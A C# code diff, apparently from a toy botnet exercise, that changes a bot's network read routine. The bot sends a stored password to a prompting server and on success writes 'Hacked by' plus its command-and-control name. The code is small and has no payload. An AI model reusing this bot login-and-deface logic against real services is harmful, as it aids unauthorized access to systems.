@@ -25,11 +25,11 @@ namespace Bot
             try
             {
                 String recievedData;
-                recievedData = readData();
-                if (recievedData.Equals("Please enter your password\\r\\n"))
+                recievedData = readData("Please enter your password\r\n".Length);
+                if (recievedData.Equals("Please enter your password\r\n"))
                 {
                     writeData(this.password);
-                    if ((recievedData = readData()).Equals("Access granted\\r\\n"))
+                    if ((recievedData = readData("Access granted\r\n".Length)).Equals("Access granted\r\n"))
                         writeData("Hacked by " + this.cNcName);
                 }
             }
@@ -50,26 +50,16 @@ namespace Bot
 
         }
 
-        public String readData()
+        public String readData(int size)
         {
             String readData = "";
 
             try
             {
-
                 NetworkStream stream = client.GetStream();
-
-                byte[] buffer = new byte[256];
-                int bytesRead;
-                List<Byte> dataFlow = new List<byte>();
-                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) == buffer.Length)
-                {
-                    for (int i = 0; i < bytesRead; i++)
-                        dataFlow.Add(buffer[i]);
-                }
-                for (int i = 0; i < bytesRead; i++)
-                    dataFlow.Add(buffer[i]);
-                readData = Encoding.ASCII.GetString(dataFlow.ToArray(), 0, dataFlow.Count);
+                byte[] buffer = new byte[size];
+                stream.Read(buffer, 0, buffer.Length);
+                readData = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
                 stream.Flush();
 
             }
